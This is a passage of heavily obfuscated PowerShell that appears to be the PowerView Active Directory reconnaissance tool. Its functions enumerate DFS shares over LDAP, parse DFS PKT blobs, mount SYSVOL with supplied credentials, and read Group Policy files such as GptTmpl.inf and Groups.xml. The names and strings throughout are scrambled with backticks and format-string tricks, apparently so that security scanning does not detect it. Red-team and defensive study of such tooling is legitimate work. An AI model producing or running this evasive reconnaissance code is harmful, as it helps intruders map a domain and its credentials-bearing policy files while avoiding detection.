                        ${sho`Rt_`pReFi`x_stA`RT} = ${sHOr`T`_PReFIX`_siZE_`enD} + 1
                        ${ShORt_p`Re`FIx_E`Nd} = ${s`hOrt_PRE`FIx_S`TART} + ${SHORt_pRE`F`IX`_SizE} - 1
                        ${SHo`R`T_`p`RefIx} =   ${K`86r}::"uNiC`Ode"."GET`s`TRInG"(${B`loB`_dAta}[${Sho`RT_pre`Fix_S`T`Art}..${ShOrt_`PRefix`_`eND}])

                        ${TyPe`_`staRT} = ${sHor`T`_pR`e`F`iX_EnD} + 1
                        ${tyPe`_`e`Nd} = ${TyPe_`STa`RT} + 3
                        ${T`ypE} =  (  &("{2}{1}{0}" -f'riAbLE','a','geT-v')  ("d"+"9eF") -VALUe  )::"T`oU`INt32"(${B`L`OB_datA}[${TyP`E_`StA`Rt}..${T`ype_`end}],0)

                        ${StA`Te_`S`TArT} = ${Ty`pE_e`ND} + 1
                        ${ST`A`TE_End} = ${sT`ATe_sTA`RT} + 3
                        ${s`TaTe} =   ( &("{1}{2}{3}{0}"-f'aBLe','g','Et','-vaRI')  ('d9'+'Ef') -VALueON  )::"To`Ui`NT32"(${bL`ob_`daTa}[${Sta`Te_sTA`RT}..${S`TATe`_`eNd}],0)

                        ${Co`m`ME`NT_SizE_st`A`RT} = ${sTa`TE`_eND} + 1
                        ${C`omM`ent_SI`ze_EnD} = ${COMmeN`T_`SIZE_`sTA`Rt} + 1
                        ${cOMm`ent_s`IzE} =   ${D9`EF}::"tO`UInt`16"(${bLo`B`_DATa}[${COmMent`_`s`Ize`_St`ArT}..${CO`mment_s`IZe_`eND}],0)
                        ${CoMmENt_`S`TArT} = ${ComMeNt`_SIz`E`_end} + 1
                        ${cOMmENT`_E`Nd} = ${comME`NT`_St`Art} + ${coM`meNt`_SI`Ze} - 1
                        if (${COmM`e`NT_SizE} -gt 0)  {
                            ${coM`M`eNt} =  ${k8`6r}::"Un`Ic`odE"."Ge`TSTriNg"(${BlO`B_`DAta}[${COMmENT`_`ST`ART}..${cO`Mm`eNT_`end}])
                        }
                        ${PreFIx_t`Ime`St`A`Mp_STa`Rt} = ${CO`M`mENT_e`Nd} + 1
                        ${PRe`F`IX_tIMEs`TaM`P_e`Nd} = ${pr`eF`ix_T`im`est`AMp_`STARt} + 7
                        
                        ${p`RefIx`_`TimesTaMp} = ${Blo`B_D`ATa}[${p`REfix_tiMEst`Am`P_St`ART}..${PRefix_`TImEsT`AMP_e`ND}] 
                        ${St`A`TE_TImEst`A`m`P_STaRt} = ${pR`EFix`_T`ImesTAM`p_End} + 1
                        ${S`Ta`T`e_TIMestamP_EnD} = ${S`T`Ate_T`iMEsTamp_S`TArt} + 7
                        ${St`ATE`_t`imESTa`mP} = ${b`Lob_`d`ATa}[${sTAtE`_`T`imeS`TAMp_StA`RT}..${S`TaT`e_timESta`m`P_eND}]
                        ${c`O`MME`NT_TImE`sT`AMP_s`Ta`RT} = ${S`TAT`e_`T`ImEsTamP_eND} + 1
                        ${cOMm`e`Nt_TIMestaM`P_E`Nd} = ${c`oM`me`N`T_timEsT`AmP_sT`ARt} + 7
                        ${ComMeNt_`TIMEs`TA`Mp} = ${b`LOB`_DA`TA}[${cOmMEnt_`TI`ME`st`AMp_ST`A`RT}..${COMMEn`T_ti`m`es`TA`MP_`ENd}]
                        ${V`ErSion_s`TART} = ${CommEnT_Ti`M`E`Sta`mP_enD}  + 1
                        ${veR`S`I`oN_EnD} = ${V`e`Rsio`N_STA`RT} + 3
                        ${V`e`RSiON} =  ${d`9EF}::"to`U`inT32"(${BL`O`B_DATa}[${v`eRsION_`sTarT}..${VERs`ioN`_e`Nd}],0)

                        
                        ${dFs_ta`Rg`etliS`T_`BloB_sI`Z`E_S`TART} = ${vErSi`O`N`_End} + 1
                        ${dfs`_`TARG`E`TLISt_BlOb_`SiZE_end} = ${dfS_Ta`RGeTLIST_`Bl`ob`_Si`Z`e_StARt} + 3
                        ${DFs_`TARGET`L`ISt_BlOb`_SIze} =  (  &("{2}{1}{0}"-f'iaBLE','R','Va') ("{1}{0}" -f'f','D9E') -vaLU  )::"t`Ouint32"(${bl`Ob`_Da`Ta}[${DFS_ta`RGETLI`s`T`_b`Lo`B_`SiZ`e`_StarT}..${dFs_TaRg`E`T`lIsT_`B`l`Ob`_SIZe_END}],0)

                        ${D`FS_`Ta`RgE`TlIs`T_`B`Lob_st`ARt} = ${dfs_t`Arg`etLIST_blob_S`IZ`E`_e`Nd} + 1
                        ${dfS`_t`AR`GETlist_BlOb`_End} = ${Df`s_tA`RGE`TliSt`_bLO`B_STArt} + ${dFS_`TargeTl`IS`T_BloB_`SIze} - 1
                        ${d`FS_`Tar`Getlis`T_B`Lob} = ${B`LoB_D`A`Ta}[${d`Fs_`TaR`G`ETli`s`T_BlOb_start}..${dfs_t`ARge`T`lI`St`_BloB`_EnD}]
                        ${REseRVed`_BlOb`_`s`ize_`sta`Rt} = ${DFs_TA`Rg`eTli`ST`_BlOB_EnD} + 1
                        ${Re`sER`Ved_B`lOb_sizE_E`ND} = ${r`eS`eRV`eD_BL`ob`_SiZ`e_St`ArT} + 3
                        ${Res`ErV`ed_B`LOB_`s`IZE} =  ${D9`eF}::"t`ouint32"(${b`LOb_`DatA}[${rEsEr`VEd_BL`OB_SiZe_`sT`ArT}..${rESERVeD_bLO`B_S`I`z`E_e`Nd}],0)

                        ${Rese`RvED_B`L`oB`_`stArT} = ${res`ERVEd_B`loB_`SI`Z`e_END} + 1
                        ${ReS`erV`ed`_B`lob_END} = ${resERv`ed_b`Lob_S`TA`Rt} + ${reSErVeD_bl`oB`_s`IZE} - 1
                        ${RESERv`Ed`_b`L`Ob} = ${B`LoB_D`Ata}[${Re`serv`eD`_BLob_`stArt}..${Re`serV`e`D`_bLOB`_eND}]
                        ${re`FeRraL`_TtL`_S`TArt} = ${r`esERV`e`D_b`l`ob_enD} + 1
                        ${REfERRA`L_tt`L_`END} = ${rEFeR`R`AL_`TtL_S`Tart} + 3
                        ${refER`RA`l`_TTl} =  ${D`9Ef}::"To`U`iNT32"(${BlO`B_`Data}[${r`EFE`RRal_Tt`L_sT`A`RT}..${rEFE`RRA`l`_TTL_ENd}],0)

                        
                        ${tAR`gET_cO`UN`T_sT`ART} = 0
                        ${t`Ar`geT`_COuNT_END} = ${tAr`GEt_`c`OuN`T_stArT} + 3
                        ${t`ARg`E`T_COuNt} =   (  &("{0}{2}{1}"-f'Vari','bLe','A')  ("{0}{1}"-f 'D','9ef'))."v`ALue"::"tO`UIn`T32"(${dFS_TAR`GETLi`sT`_blob}[${tARG`ET`_`cOUn`T_S`TArt}..${TAr`GEt_c`oUNT_`eNd}],0)
                        ${T_O`FfS`et} = ${T`ARg`et_co`UnT_EnD} + 1

                        for(${J}=1; ${J} -le ${tAR`Ge`T_C`Ount}; ${J}++){
                            ${TAR`G`Et_EN`TrY_s`I`ZE_`stArt} = ${T_`O`FFSEt}
                            ${tarGeT_eN`Tr`y_siZe_`End} = ${tARge`T_E`N`TR`y_`Si`ze_StaRT} + 3
                            ${tAR`G`Et`_e`N`Try_Size} =  (&('Ls')  ("{1}{3}{0}{2}"-f 'bL','V','e:D9ef','aRIa')  )."vA`luE"::"t`OUiNT32"(${dfS_`Tar`Getl`iS`T_Blob}[${TA`R`gEt_EnTRy_s`I`Ze_STa`Rt}..${t`ArgeT_`ENTry_`S`Ize`_`end}],0)
                            ${tA`Rg`et_tIme`_Stamp_s`TarT} = ${T`ARge`T_ent`R`y_Siz`e_ENd} + 1
                            ${TaR`Ge`T_tim`e_st`Amp_eND} = ${Tar`GEt_TIme_`s`T`AmP_`stArt} + 7
                            
                            ${ta`Rget_T`i`mE_StAMp} = ${DfS`_`TAR`Ge`Tlist_blOB}[${TARG`ET`_`TiME_s`TAMp_StARt}..${TARgET`_tIM`E`_sT`Am`p_`eND}]
                            ${Target`_`st`At`E`_StarT} = ${taRG`e`T_Ti`me`_stamp`_eNd} + 1
                            ${T`A`RgET_st`A`TE_end} = ${T`Ar`GET_ST`ATe_START} + 3
                            ${T`ARGet_`STa`TE} =   ${d9`EF}::"T`oUin`T32"(${DF`S_`TAr`g`EtLIst_Blob}[${TAr`geT`_`sTAtE`_St`Art}..${T`A`RGEt`_st`ATe_END}],0)

                            ${ta`Rge`T`_type_STARt} = ${TARGE`T_S`T`AT`e_EnD} + 1
                            ${T`A`RgeT_Typ`E_`enD} = ${tarGet_`T`ypE_`STart} + 3
                            ${tA`R`GEt_TYpE} =  (  &("{1}{2}{0}"-f'M','geT-I','tE')  ("VarI"+"A"+"Bl"+"E"+":D9Ef"))."v`ALUE"::"t`OuInT`32"(${dfs`_TarG`Et`LIsT`_bL`oB}[${tArG`eT_TY`p`E_stARt}..${taRGE`T_TY`pE_end}],0)

                            ${serv`E`R_nAME`_SiZE`_STarT} = ${tAr`geT_TYP`e_E`ND} + 1
                            ${SERVE`R_naM`E`_SiZE_eNd} = ${SeR`V`er`_nAm`e_`S`IZe_sTART} + 1
                            ${s`ErV`eR_NAme`_SIZe} =   (&("{2}{1}{0}"-f 'rIABLE','A','V') ("D9e"+"F") )."VA`LuE"::"T`OUiNt`16"(${D`Fs`_tARgeTLisT`_BlOB}[${s`e`Rver_`NaME_s`IZE_s`T`A`Rt}..${SERv`Er`_na`m`E_sIZE_ENd}],0)

                            ${s`ER`VeR_nA`mE`_STart} = ${Se`R`VEr_`NamE_`S`izE_END} + 1
                            ${SER`VeR_n`Ame_`End} = ${seRvEr_`NA`ME_`sTA`RT} + ${seR`VER_name`_`sizE} - 1
                            ${SERV`er`_NAmE} =  ${K8`6r}::"uNic`O`DE"."GetstR`i`NG"(${Df`s_`T`ArgEtLIs`T_`BlOB}[${sERVER_`NaME`_s`TARt}..${SE`R`Ver_NamE_eNd}])

                            ${sh`A`RE`_NAmE`_sIzE_`ST`ARt} = ${Se`RVeR_NAmE_`e`Nd} + 1
                            ${shARe_N`Am`e`_sIZE_E`Nd} = ${sH`A`RE`_nA`ME_SiZE`_STa`RT} + 1
                            ${SH`AR`E_N`AMe_sIzE} =   (&("{2}{1}{0}" -f 'RIABlE','t-VA','gE') ("{0}{1}"-f 'D','9eF') -vALU )::"TouI`NT`16"(${Dfs`_taR`g`ETL`Ist_b`Lob}[${shar`e_N`Am`E_sI`z`E_s`TaRT}..${shAR`e`_nam`e`_SIze_enD}],0)
                            ${shar`E`_n`AMe_sTart} = ${SHa`Re_na`M`e`_sizE_end} + 1
                            ${ShArE`_`NAM`E_e`ND} = ${sH`AR`E_`NAMe_sTArT} + ${SHAr`e`_nAM`e_s`iZE} - 1
                            ${Sh`AR`e_nA`Me} =  (  &("{1}{0}"-f'R','di')  ("Va"+"RiAB"+"lE:k86R"))."V`Alue"::"unI`code"."gE`TsT`RINg"(${Dfs`_T`ARgETL`ist_B`lob}[${shARe`_`NAme_`StarT}..${sH`Are_n`A`mE_End}])

                            ${t`Ar`GeT_l`Ist} += "\\$server_name\$share_name"
                            ${T`_off`SET} = ${SHA`Re`_NAm`E_eND} + 1
                        }
                    }
                }
                ${Offs`eT} = ${Bl`o`B_`dA`Ta_ENd} + 1
                ${DFS_Pkt_pROP`e`RT`ies} = @{
                    ("{0}{1}" -f 'N','ame') = ${bLO`B`_n`Ame}
                    ("{1}{0}" -f 'ix','Pref') = ${Pre`FIX}
                    ("{0}{2}{1}" -f 'Targ','st','etLi') = ${TarG`ET_L`i`sT}
                }
                ${obj`e`cT_`lisT} += &("{2}{0}{1}"-f'-','Object','New') -TypeName ("{2}{1}{0}" -f'bject','SO','P') -Property ${df`s_`pkT_P`R`opeRTI`ES}
                ${Pr`eFIx} = ${NU`lL}
                ${BL`oB_NA`mE} = ${n`UlL}
                ${Ta`RG`e`T_LIst} = ${n`UlL}
            }

            ${SeRV`e`RS} = @()
            ${objecT`_l`i`st} | &("{3}{1}{0}{2}"-f'ch-O','a','bject','ForE') {
                if (${_}."TaRG`EtL`I`st") {
                    ${_}."tARge`Tli`st" | &("{2}{1}{0}{3}" -f'bj','orEach-O','F','ect') {
                        ${SeR`Ve`Rs} += ${_}.("{1}{0}" -f 'plit','s').Invoke('\')[2]
                    }
                }
            }

            ${SER`V`ers}
        }

        function Get-DOMa`InD`FSS`ha`R`Ev1 {
            [CmdletBinding()]
            Param(
                [String]
                ${d`omAIN},

                [String]
                ${SeARCHb`A`se},

                [String]
                ${s`Er`VEr},

                [String]
                ${SEa`Rc`HSCOpe} = ("{0}{1}{2}"-f'Subt','re','e'),

                [Int]
                ${re`s`UlTpa`GES`Ize} = 200,

                [Int]
                ${Ser`VeRtIm`elim`iT},

                [Switch]
                ${To`M`Bs`TonE},

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                ${CR`e`D`eNtiaL} =  (  &("{3}{1}{0}{2}"-f '-VARiAbl','eT','e','g')  ("{1}{0}" -f'o6','jh3x')  -VAlUEo  )::"eM`pTy"
            )

            ${d`F`sS`eArCHER} = &("{0}{1}{2}{4}{3}" -f 'Get-D','o','main','rcher','Sea') @PSBoundParameters

            if (${dFsSe`ARcH`ER}) {
                ${D`Fss`Ha`ReS} = @()
                ${dF`SseAR`Ch`Er}."fI`lter" = ((("{3}{0}{5}{1}{4}{2}"-f 'lass=','Df','))','(&(objectC','s','fT')))

                try {
                    ${rE`suL`TS} = ${DF`sSE`ArchER}.("{1}{0}" -f 'll','FindA').Invoke()
                    ${ReSu`L`Ts} | &("{1}{2}{0}" -f'Object','Where','-') {${_}} | &("{0}{1}{2}{3}"-f'For','Each-Obje','c','t') {
                        ${Prop`Erti`Es} = ${_}."p`ROp`erTIEs"
                        ${reMO`T`E`NAmes} = ${pROP`Er`TI`ES}."remOTesEr`V`eRNA`Me"
                        ${P`kT} = ${p`ROP`ertiES}."p`Kt"

                        ${Df`sSHa`REs} += ${reMO`Te`Na`mES} | &("{0}{1}{2}{3}" -f'ForEac','h-','O','bject') {
                            try {
                                if ( ${_}.("{0}{1}" -f'Contai','ns').Invoke('\') ) {
                                    &("{1}{0}{2}" -f '-Objec','New','t') -TypeName ("{2}{1}{0}" -f 't','jec','PSOb') -Property @{("{0}{1}"-f'Na','me')=${PropeR`T`IeS}."Na`mE"[0];("{3}{0}{2}{1}" -f'emoteS','ame','erverN','R')=${_}.("{1}{0}" -f'plit','s').Invoke('\')[2]}
                                }
                            }
                            catch {
                                &("{1}{3}{0}{2}" -f '-Ver','Writ','bose','e') ('[Ge'+'t-Dom'+'ain'+'D'+'FSSha'+'re] '+'G'+'et-'+'Domai'+'nD'+'FS'+'Sha'+'reV1 '+'erro'+'r '+'in'+' '+'pars'+'ing'+' '+'DF'+'S '+'sha'+'re '+': '+"$_")
                            }
                        }
                    }
                    if (${Re`Su`LTs}) {
                        try { ${RE`suL`Ts}.("{0}{2}{1}"-f 'dis','e','pos').Invoke() }
                        catch {
                            &("{1}{0}{2}" -f 'e-Ve','Writ','rbose') ('[G'+'et-Domai'+'nDF'+'SS'+'hare'+']'+' '+'Get-Dom'+'ainDFSSh'+'ar'+'eV1'+' '+'erro'+'r '+'dispos'+'in'+'g '+'of'+' '+'th'+'e '+'R'+'esults '+'obj'+'ect'+': '+"$_")
                        }
                    }
                    ${df`s`SeArCheR}.("{1}{0}"-f'pose','dis').Invoke()

                    if (${p`kt} -and ${p`kT}[0]) {
                        &("{1}{0}{2}" -f 'Pk','Parse-','t') ${p`kT}[0] | &("{0}{1}{3}{2}"-f 'ForE','ach-','ect','Obj') {
                            
                            
                            
                            if (${_} -ne ("{1}{0}" -f 'l','nul')) {
                                &("{1}{2}{3}{0}"-f't','Ne','w','-Objec') -TypeName ("{2}{1}{0}" -f'ct','Obje','PS') -Property @{("{1}{0}"-f'ame','N')=${pRO`PEr`TiES}."n`AMe"[0];("{0}{1}{4}{2}{3}" -f'R','em','erve','rName','oteS')=${_}}
                            }
                        }
                    }
                }
                catch {
                    &("{0}{1}{2}{3}"-f'Write-','Warn','in','g') ('[Ge'+'t-Domai'+'n'+'DFSShare] '+'Ge'+'t-'+'DomainDFSSha'+'reV1 '+'err'+'or '+': '+"$_")
                }
                ${DFs`S`harEs} | &("{3}{0}{2}{1}" -f'r','t','t-Objec','So') -Unique -Property ("{1}{0}{2}" -f'e','R','moteServerName')
            }
        }

        function GeT-doMaI`NdF`sS`Har`ev2 {
            [CmdletBinding()]
            Param(
                [String]
                ${domA`iN},

                [String]
                ${sE`A`Rc`HBASe},

                [String]
                ${s`erV`er},

                [String]
                ${sEaRC`H`sCOPE} = ("{0}{1}"-f 'Subtr','ee'),

                [Int]
                ${R`esu`lt`pAgesiZe} = 200,

                [Int]
                ${s`erVeRTiM`elI`M`It},

                [Switch]
                ${Tom`B`StOnE},

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                ${c`ReDeN`TIal} =   ( &("{0}{2}{1}" -f'ch','M','ildItE') ('VAR'+'IAbLE'+':'+'jH3XO6')  )."v`ALuE"::"e`mpTY"
            )

            ${DFS`Sea`RCH`eR} = &("{3}{2}{1}{0}" -f'archer','Se','ain','Get-Dom') @PSBoundParameters

            if (${D`F`SSEaRc`hEr}) {
                ${Df`ssHAr`Es} = @()
                ${Df`sse`ARCHeR}."f`iLtEr" = ("{2}{1}{3}{5}{0}{4}" -f 'v2','Class=m','(&(object','s','))','DFS-Link')
                ${n`UlL} = ${DfSs`ea`RchEr}."p`Ro`PE`RTIEs`TOLoAD".("{2}{1}{0}" -f 'nge','Ra','Add').Invoke((("{3}{2}{4}{0}{1}" -f'kp','athv2','li','msdfs-','n'),("{1}{0}{2}{3}" -f 'r','msDFS-Ta','g','etListv2')))

                try {
                    ${reS`UL`TS} = ${dF`SSearCH`Er}.("{1}{0}"-f'indAll','F').Invoke()
                    ${re`Su`lTs} | &("{1}{3}{0}{2}" -f'O','W','bject','here-') {${_}} | &("{0}{1}{2}" -f 'ForEach','-Objec','t') {
                        ${Pr`oP`eRTieS} = ${_}."pr`oper`TIeS"
                        ${TArG`Et_`List} = ${pR`opE`RtiES}.'msdfs-targetlistv2'[0]
                        ${X`Ml} = [xml]  ( &('Ls')  ("Var"+"I"+"abLE"+":K86R")  )."V`ALue"::"unI`cODe"."GET`Str`iNG"(${tA`RG`eT_`LIst}[2..(${tA`RgEt_l`I`ST}."Le`N`gTH"-1)])
                        ${d`F`SsHarEs} += ${X`ml}."targ`ETs"."C`hIldnOD`eS" | &("{0}{1}{2}"-f 'F','o','rEach-Object') {
                            try {
                                ${tar`G`Et} = ${_}."INN`Er`TExt"
                                if ( ${ta`Rg`et}.("{0}{2}{1}"-f 'Con','s','tain').Invoke('\') ) {
                                    ${D`FS`ROOt} = ${t`A`RGet}.("{0}{1}" -f 'spli','t').Invoke('\')[3]
                                    ${Sha`R`eNAme} = ${PR`oP`erTI`eS}.'msdfs-linkpathv2'[0]
                                    &("{1}{0}{2}" -f'w-','Ne','Object') -TypeName ("{2}{1}{0}"-f 'ject','SOb','P') -Property @{("{1}{0}"-f'e','Nam')="$DFSroot$ShareName";("{2}{3}{1}{0}{4}" -f'rNa','ve','Rem','oteSer','me')=${ta`RgeT}.("{0}{1}" -f 'spl','it').Invoke('\')[2]}
                                }
                            }
                            catch {
                                &("{2}{1}{0}"-f'ite-Verbose','r','W') ('[Ge'+'t'+'-Domain'+'DFSSha'+'re] '+'G'+'et-'+'Domain'+'DFSS'+'ha'+'reV2 '+'erro'+'r '+'in'+' '+'par'+'sing'+' '+'tar'+'get '+': '+"$_")
                            }
                        }
                    }
                    if (${RE`sUL`TS}) {
                        try { ${r`es`ULts}.("{2}{0}{1}"-f'sp','ose','di').Invoke() }
                        catch {
                            &("{3}{1}{2}{0}"-f 'e','r','bos','Write-Ve') ('[G'+'e'+'t-D'+'omainD'+'FSShar'+'e] '+'E'+'rror '+'d'+'is'+'p'+'osing '+'o'+'f '+'the'+' '+'Resu'+'l'+'ts '+'ob'+'ject: '+"$_")
                        }
                    }
                    ${dF`sS`e`ArCHER}.("{1}{0}"-f 'spose','di').Invoke()
                }
                catch {
                    &("{1}{2}{0}"-f 'g','Write-W','arnin') ('[Get'+'-D'+'om'+'ainDFSSh'+'are]'+' '+'Ge'+'t-DomainDFSSh'+'are'+'V'+'2 '+'err'+'or '+': '+"$_")
                }
                ${Df`sshAr`Es} | &("{0}{1}{2}" -f 'Sor','t-Obj','ect') -Unique -Property ("{1}{2}{0}{3}" -f'oteServe','Re','m','rName')
            }
        }
    }

    PROCESS {
        ${dFs`sh`ArES} = @()

        if (${ps`B`oUNDpArAmeTe`Rs}[("{1}{0}"-f'n','Domai')]) {
            ForEach (${Tar`GEt`DO`maIN} in ${DO`Main}) {
                ${S`EAR`cHE`R`A`RGumEnts}[("{0}{1}"-f 'D','omain')] = ${TARGe`Tdom`Ain}
                if (${Ve`RSIOn} -match ((("{1}{0}" -f'l{0}1','al'))  -F [chAR]124)) {
                    ${DfsSHA`R`Es} += &("{0}{2}{5}{3}{4}{6}{1}" -f 'Get','V1','-Doma','n','DFSSha','i','re') @SearcherArguments
                }
                if (${vE`RS`IoN} -match ((("{1}{0}{2}" -f'll5x','a','k2'))  -ReplAcE ([chAr]53+[chAr]120+[chAr]107),[chAr]124)) {
                    ${Df`ss`HaReS} += &("{0}{3}{2}{1}" -f 'Get-D','eV2','inDFSShar','oma') @SearcherArguments
                }
            }
        }
        else {
            if (${vers`ION} -match ((("{0}{1}{2}"-f 'a','llF2p','1')) -cReplAce  ([ChAR]70+[ChAR]50+[ChAR]112),[ChAR]124)) {
                ${DFs`ShAr`es} += &("{1}{2}{3}{0}{4}" -f 'areV','Get-Doma','inD','FSSh','1') @SearcherArguments
            }
            if (${V`eR`sIon} -match ((("{2}{0}{1}" -f 'G','2','alltj'))."R`ePla`Ce"(([Char]116+[Char]106+[Char]71),'|'))) {
                ${dfSs`ha`R`Es} += &("{4}{1}{5}{0}{2}{3}"-f 'inD','Do','FSShare','V2','Get-','ma') @SearcherArguments
            }
        }

        ${df`s`sHAREs} | &("{0}{1}{2}" -f 'Sort-','Ob','ject') -Property (("{3}{1}{2}{0}{4}" -f'm','teServer','Na','Remo','e'),("{0}{1}"-f'Nam','e')) -Unique
    }
}








function get-`gP`TtMpL {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{2}" -f'PSShou','ldP','rocess'}, '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [Parameter(maNdaToRY = ${Tr`Ue}, VALUefRomPIpeLiNE = ${tr`Ue}, ValUeFroMpIPelInebyPROpERTYNAme = ${t`RuE})]
        [Alias({"{0}{1}{2}{3}"-f'g','p','cfilesysp','ath'}, {"{0}{1}"-f'Pa','th'})]
        [String]
        ${G`pTTM`pLp`ATh},

        [Switch]
        ${OUT`p`Uto`BjEcT},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CReDE`N`TiAl} =   (  &("{2}{0}{1}" -f'te','m','geT-cHiLdi') ("VaRI"+"abLE:jh3x"+"o"+"6"))."V`Alue"::"em`pTy"
    )

    BEGIN {
        ${MaPPEd`P`AThs} = @{}
    }

    PROCESS {
        try {
            if ((${gptTM`pl`pATH} -Match ((("{0}{2}{1}{3}{4}" -f '{','}{','0','0}{0','}{0}.*{0}{0}.*'))-F  [Char]92)) -and (${psBoU`Nd`pAR`A`meTErs}[("{2}{1}{0}"-f'l','entia','Cred')])) {
                ${SYS`VO`lPaTH} = "\\$((New-Object System.Uri($GptTmplPath)).Host)\SYSVOL "
                if (-not ${M`AP`pEdPATHS}[${S`yS`V`OLpAtH}]) {
                    
                    &("{1}{3}{0}{2}"-f 'Connec','Add-R','tion','emote') -Path ${s`YSvol`PA`Th} -Credential ${C`R`edenTIAL}
                    ${mAP`Pe`D`pathS}[${s`y`SVOLPA`TH}] = ${tR`Ue}
                }
            }

            ${T`Ar`gETgPTT`m`plPAtH} = ${gPT`TMPLp`A`Th}
            if (-not ${t`AR`GeTgPTtM`PlP`ATh}.("{0}{1}{2}"-f'E','nd','sWith').Invoke(("{1}{0}"-f'f','.in'))) {
                ${T`ARGE`T`GpttMPlpAtH} += ((("{7}{13}{3}{2}{10}{12}{6}{9}{8}{1}{4}{0}{11}{5}" -f 'p','AS','roso','c','ecEditabAG','pl.inf','Windo','abAMACHI','Tab','ws N','ftab','tTm','A','NEabAMi'))."rEPLa`Ce"('abA',[stRINg][chAr]92))
            }

            &("{4}{1}{2}{3}{0}" -f 'se','-Ver','b','o','Write') ('[G'+'et-G'+'ptTmp'+'l] '+'P'+'arsin'+'g '+'G'+'ptTmp'+'lPath: '+"$TargetGptTmplPath")

            if (${P`sBoUNdpar`AmE`Ters}[("{3}{1}{2}{0}"-f'ject','tO','b','Outpu')]) {
                ${CO`N`T`EnTS} = &("{4}{3}{0}{1}{2}"-f 'C','on','tent','-Ini','Get') -Path ${t`ARGetg`PtTMp`LpaTh} -OutputObject -ErrorAction ("{1}{0}"-f 'op','St')
                if (${c`OntE`N`TS}) {
                    ${c`ON`TeNts} | &("{2}{0}{1}"-f'd-M','ember','Ad') ("{0}{1}{2}{3}"-f'No','teprop','er','ty') ("{0}{1}"-f 'Pat','h') ${tar`gE`TGp`TtMplP`ATh}
                    ${Cont`En`TS}
                }
            }
            else {
                ${con`T`ents} = &("{0}{2}{3}{1}" -f'Get-In','ntent','iC','o') -Path ${t`ARG`ETg`PttMpl`PA`Th} -ErrorAction ("{0}{1}"-f 'Sto','p')
                if (${Co`Nte`NTs}) {
                    ${C`OntE`NtS}[("{0}{1}" -f'Pa','th')] = ${t`Ar`gE`TGpTtMpL`p`ATH}
                    ${COnt`En`TS}
                }
            }
        }
        catch {
            &("{0}{1}{2}"-f 'Writ','e-','Verbose') ('['+'G'+'et-G'+'ptT'+'mpl] '+'Erro'+'r '+'p'+'arsing '+"$TargetGptTmplPath "+': '+"$_")
        }
    }

    END {
        
        ${MApPeDpa`T`hs}."KE`ys" | &("{2}{1}{0}{3}{4}"-f 'ac','orE','F','h-O','bject') { &("{0}{2}{4}{3}{1}"-f 'Remove-','n','Rem','io','oteConnect') -Path ${_} }
    }
}


function GeT-GRO`U`Ps`XmL {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{2}{1}{0}" -f's','s','ouldProce','PSSh'}, '')]
    [OutputType({"{1}{2}{3}{0}" -f'upsXML','Power','V','iew.Gro'})]
    [CmdletBinding()]
    Param (
        [Parameter(MaNDAtOrY = ${tr`Ue}, vaLuEFrOmpipElInE = ${Tr`UE}, VALUEFRomPiPELiNeByPrOPerTyNAME = ${t`RUE})]
        [Alias({"{1}{0}" -f 'th','Pa'})]
        [String]
        ${GROu`psx`ml`pAtH},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`REDent`iaL} =  (&("{0}{1}{2}"-f'VA','RI','ABle') ('J'+'H3X'+'O6') -ValUEOn  )::"eM`PTy"
    )

    BEGIN {
        ${Ma`ppE`dpA`ThS} = @{}
    }

    PROCESS {
        try {
            if ((${GroUP`sx`MLPa`Th} -Match ((("{1}{4}{2}{5}{6}{0}{3}"-f 'AQsAQ','sAQsA','Q','.*','QsA','sAQ.','*s'))."R`E`placE"('sAQ',[STriNg][CHAr]92))) -and (${PsBo`Un`D`p`ArAMEt`eRs}[("{0}{2}{1}" -f 'Creden','l','tia')])) {
                ${SYsV`ol`pATh} = "\\$((New-Object System.Uri($GroupsXMLPath)).Host)\SYSVOL "
                if (-not ${M`APPe`DP`AThs}[${S`ysvoL`p`Ath}]) {
                    
                    &("{1}{3}{5}{0}{2}{4}"-f 'oteConnec','Add-','tio','Re','n','m') -Path ${sY`SV`olpaTh} -Credential ${c`ReDE`NT`Ial}
                    ${MAPPE`dpat`HS}[${S`Ysv`OlPatH}] = ${t`RUE}
                }
            }

            [XML]${G`RoupSx`m`l`CO`NTenT} = &("{2}{0}{3}{1}" -f'-Conte','t','Get','n') -Path ${gro`UPSxmlPa`Th} -ErrorAction ("{0}{1}" -f'Sto','p')

            
            ${gROupsxMLcO`N`T`eNt} | &("{2}{0}{1}" -f'e','lect-Xml','S') ("{4}{0}{1}{2}{3}"-f'ps/G','ro','u','p','/Grou') | &("{1}{2}{0}" -f'Object','Selec','t-') -ExpandProperty ("{0}{1}" -f'nod','e') | &("{2}{4}{0}{1}{3}" -f 'h','-Obj','ForEa','ect','c') {

                ${G`R`O`UPNAmE} = ${_}."Pr`OP`ErTIEs"."GROU`p`NAme"

                
                ${G`ROup`SID} = ${_}."prO`P`ErtieS"."GR`O`UpsId"
                if (-not ${GRoup`SId}) {
                    if (${groUP`N`A`mE} -match ("{2}{3}{0}{1}" -f'strator','s','Admi','ni')) {
                        ${gRo`U`p`SId} = ("{1}{3}{2}{0}"-f'4','S-1-','54','5-32-')
                    }
                    elseif (${g`R`oup`NaMe} -match ("{0}{1}{2}{3}" -f'Remo','t','e De','sktop')) {
                        ${grOU`PS`iD} = ("{2}{1}{0}" -f'5','-1-5-32-55','S')
                    }
                    elseif (${G`R`oupNaME} -match ("{1}{0}"-f'ests','Gu')) {
                        ${G`R`oUpSid} = ("{1}{0}{2}"-f'32-5','S-1-5-','46')
                    }
                    else {
                        if (${p`sBOun`d`PaRAMEtErs}[("{0}{1}{2}"-f 'Crede','ntia','l')]) {
                            ${G`R`oUpsid} = &("{2}{0}{4}{3}{1}"-f'nve','SID','Co','To-','rt') -ObjectName ${G`RO`U`Pname} -Credential ${Crede`N`T`IAl}
                        }
                        else {
                            ${gr`oUP`sid} = &("{3}{1}{0}{2}"-f'o','nvertT','-SID','Co') -ObjectName ${G`RouP`NAME}
                        }
                    }
                }

                
